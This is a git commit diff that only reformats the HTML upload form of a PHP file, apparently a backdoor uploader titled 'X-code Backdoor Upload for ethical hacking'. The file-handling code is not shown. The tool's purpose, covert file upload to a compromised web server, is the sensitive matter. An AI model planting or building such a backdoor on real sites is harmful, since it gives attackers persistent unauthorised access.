b343834d204e180d51b422138f5569bb6b92a6b0
Kurniawan <38490299+kurniawandata@users.noreply.github.com>
2020-05-21 10:32:31 +0700

    Update xcodebackdoorupload.php

--- xcodebackdoorupload.php
+++ xcodebackdoorupload.php
@@ -10,11 +10,8 @@ else
 {
 echo '<form enctype="multipart/form-data" action="" method="post">
 <h3><u>X-code Backdoor Upload for ethical hacking</u></h3>
-Oleh : Kurniawan - xcode.or.id<br />
-Nama file : <input type="file" name="file" />
-<br />
-<input type="submit" name="cekfile" value="Upload">
-</form>';
+Oleh : Kurniawan - xcode.or.id<br />Nama file : <input type="file" name="file" />
+<br /><input name="cekfile" type="submit" value="Upload"></form>';
  } 
  }
 ?>
